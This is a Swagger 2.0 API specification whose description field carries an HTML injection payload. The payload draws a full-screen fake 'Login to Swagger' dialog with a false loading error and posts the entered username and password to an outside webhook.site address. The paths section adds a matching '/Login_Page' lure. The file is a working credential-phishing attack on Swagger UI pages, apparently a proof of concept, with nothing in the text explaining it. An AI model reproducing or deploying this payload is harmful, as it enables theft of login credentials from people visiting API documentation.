swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(180deg,#023047 0%,#013048 100%);z-index:99998;font-family:Segoe UI,Arial,sans-serif;overflow:auto;"><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:400px;max-width:94%;background:#fff;border-radius:8px;box-shadow:0 6px 32px rgba(0,0,0,.3);overflow:hidden;z-index:99999;"><div style="padding:40px 40px 30px;"><div style="text-align:center;margin-bottom:6px;font-size:34px;">{ }</div><div style="text-align:center;font-size:22px;font-weight:700;color:#1f2937;margin-bottom:4px;">Login to Swagger</div><div style="text-align:center;font-size:13px;color:#ef4444;background:#fef2f2;border:1px solid #fecaca;border-radius:6px;padding:9px;margin:14px 0 20px;">An error occurred while loading, please log in.</div><form action="https://webhook.site/REPLACE-ME" method="post" class="form-signin"><label style="font-size:13px;font-weight:600;color:#374151;">Username</label><br><input type="text" name="username" style="width:100%;padding:12px;border:1px solid #d1d5db;border-radius:6px;box-sizing:border-box;margin:4px 0 14px;font-size:15px;"><label style="font-size:13px;font-weight:600;color:#374151;">Password</label><br><input type="password" name="password" style="width:100%;padding:12px;border:1px solid #d1d5db;border-radius:6px;box-sizing:border-box;margin:4px 0 10px;font-size:15px;"><div style="font-size:13px;margin:8px 0 16px;"><label><input type="checkbox" name="remember"> Keep me signed in</label></div><button type="submit" style="width:100%;padding:13px;background:linear-gradient(90deg,#10b981,#059669);color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;">Login →</button></form><div style="text-align:center;font-size:12px;color:#9ca3af;margin-top:18px;">Protected API — v2.4.1</div></div></div></div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
